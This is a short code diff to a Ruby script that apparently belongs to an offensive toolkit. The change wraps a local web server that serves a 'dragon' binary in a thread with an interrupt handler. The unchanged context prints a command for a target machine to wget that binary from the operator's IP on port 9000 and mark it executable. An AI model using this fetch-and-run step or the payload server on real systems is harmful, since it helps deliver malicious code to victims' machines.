@@ -94,7 +94,13 @@ if command == "dragon"
 >\e[032m wget \e[33mip\e[032m:9000/dragon; chmod +x dragon \e[0m
 
 "
-  system("ruby -run -ehttpd ~/.sith/drag0n/dragon -p 9000")
+  shell_thread = Thread.new do
+    system("ruby -run -ehttpd ~/.sith/drag0n/dragon -p 9000")
+  end
+
+  trap('INT') { shell_thread.kill }
+
+  shell_thread.join
 end
 
 #dproxy
